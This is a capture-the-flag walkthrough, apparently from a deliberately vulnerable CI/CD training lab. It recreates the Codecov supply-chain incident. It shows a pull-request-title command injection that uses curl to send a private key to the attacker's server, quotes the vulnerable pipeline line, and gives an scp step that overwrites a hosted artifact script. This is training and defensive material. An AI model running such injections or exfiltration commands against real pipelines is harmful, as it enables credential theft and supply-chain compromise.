[![CICD-SEC-8 Ungoverned Usage of 3rd Party Services](https://img.shields.io/badge/CICD--SEC--8-Ungoverned%20Usage%20of%203rd%20Party%20Services-brightgreen)](https://www.cidersecurity.io/top-10-cicd-security-risks/ungoverned-usage-of-3rd-party-services/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_100422)

[![CICD-SEC-9 Improper Artifact Integrity Validation](https://img.shields.io/badge/CICD--SEC--9-Improper%20Artifact%20Integrity%20Validation-brightgreen)](https://www.cidersecurity.io/top-10-cicd-security-risks/improper-artifact-integrity-validation/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_100422)

This challenge draws inspiration from the [Codecov incident](https://about.codecov.io/security-update/), in which a 3rd party artifact included in the pipeline is hijacked.

Codecov has a script used in customers’ CI pipelines. The script was hosted separately from its open-sourced code. The script was modified directly where it’s stored (without changing the source code) with malicious code that stole credentials from pipeline jobs.

Pipelines that would have validated the script’s hash against the repository code, would have prevented a successful attack.

In the challenge, Reportcov is a public repository of a 3rd party used by other CI pipelines. It has its own pipeline (which you can’t view), creating an artifact stored remotely. You can execute command injection in the pipeline in order to run malicious code in the job, steal the private key of the server hosting the artifact, and then modify it to exfiltrate credentials from CI pipelines that use the artifact.



1. Fork the _Cov/reportcov_ repository and create an arbitrary change.
2. Create a pull request with the following command as its title:

    ```shell
    `echo "${KEY}" > key && curl -v -F file=@key <YOUR SERVER>`
    ```
    The injection is possible since the following line treats the title as a bash variable and as such it can evaluate command substitution inside.
    
    `sh "echo Pull Request ${title} created in the reportcov repository"`

    GitHub published an [interesting article](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) about command injection in CI pipelines.

3. Use the private key to upload a malicious _reportcov.sh_ script: 

    ```shell
    echo "${FLAG}" | base64 > reportcov.sh
    chmod 400 key
    scp -P 2222 -i key reportcov.sh root@localhost:/var/www/localhost/htdocs
    ```


4. Run the dormouse pipeline.
5. Access the console output of the executed job to get the secret.
